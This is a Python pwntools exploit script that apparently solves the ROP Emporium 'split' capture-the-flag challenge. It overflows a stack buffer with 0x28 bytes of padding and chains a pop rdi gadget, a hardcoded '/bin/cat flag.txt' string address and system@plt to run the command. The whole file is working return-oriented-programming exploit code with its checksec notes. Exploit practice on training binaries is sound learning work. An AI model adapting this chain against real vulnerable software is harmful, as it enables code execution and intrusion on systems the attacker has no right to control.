from pwn import *
"""
Task:
    1. Find '/bin/cat flag.txt' addr.
        cat_flag = 0x00601060
    2. Call System("/bin/cat flag.txt")
Checksec:
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

"""

def exploit():
    p = process("./split")
    e = ELF('./split')


    # proc.wait_for_debugger(p.pid)

    # Gadget
    system_plt = e.plt['system']
    cat_flag = 0x00601060
    pop_rdi = 0x00000000004007c3

    print(f"System Function: {hex(system_plt)}")

    buf = b''
    buf += b"A"*0x28
    buf += p64(pop_rdi)
    buf += p64(cat_flag)    # pop cat_flag to system arg
    buf += p64(system_plt)  # call system


    p.sendline(buf)

    p.interactive()

exploit()
